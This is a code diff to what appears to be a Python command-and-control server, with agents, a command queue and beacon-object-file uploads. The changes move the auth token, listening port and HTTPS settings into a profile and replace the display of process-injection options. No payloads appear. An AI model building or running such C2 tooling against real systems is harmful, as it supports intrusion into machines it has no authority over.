@@ -30,7 +30,8 @@ command_queue = {}
 BOF_DIR       = "bofs"
 UPLOAD_DIR    = "uploads"
 STATE_FILE    = "agents.json"
-AUTH_TOKEN    = os.environ.get("C2_AUTH_TOKEN", "")
+ENV_AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "")
+AUTH_TOKEN    = ENV_AUTH_TOKEN if ENV_AUTH_TOKEN else profile.auth_token
 AUTH_HEADER   = profile.auth_header
 SSL_CERT_FILE = os.environ.get("C2_SSL_CERT", "")
 SSL_KEY_FILE  = os.environ.get("C2_SSL_KEY", "")
@@ -528,9 +529,9 @@ def cmd_profile():
     row("Jitter",             f"±{profile.jitter_ms}ms")
     row("User-Agent",         profile.user_agent[:50] + ("..." if len(profile.user_agent) > 50 else ""))
     row("Auth Header",        profile.auth_header)
-    row("Injection Enabled",  "Yes" if profile.injection_enabled else "No")
-    if profile.injection_enabled:
-        row("Spawn-To",       profile.spawn_to)
+    row("Server IP",          profile.server_ip)
+    row("Server Port",        str(profile.server_port))
+    row("HTTPS",              "Yes" if profile.use_https else "No")
     section_end()
 
 def cmd_help():
@@ -701,11 +702,15 @@ if __name__ == "__main__":
 
     if AUTH_TOKEN:
         log(f"register auth enabled  header={AUTH_HEADER}", "warn")
-    if SSL_CONTEXT:
-        log(f"HTTPS enabled  cert={SSL_CERT_FILE} key={SSL_KEY_FILE}", "warn")
+    if profile.use_https:
+        if SSL_CONTEXT:
+            log(f"HTTPS enabled  cert={SSL_CERT_FILE} key={SSL_KEY_FILE}", "warn")
+        else:
+            log("HTTPS requested by profile but no cert/key configured; starting HTTP", "warn")
 
     def _flask():
-        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True, ssl_context=SSL_CONTEXT)
+        app.run(host="0.0.0.0", port=profile.server_port, debug=False, use_reloader=False, threaded=True,
+                ssl_context=SSL_CONTEXT if profile.use_https else None)
 
     threading.Thread(target=_flask, daemon=True).start()
 
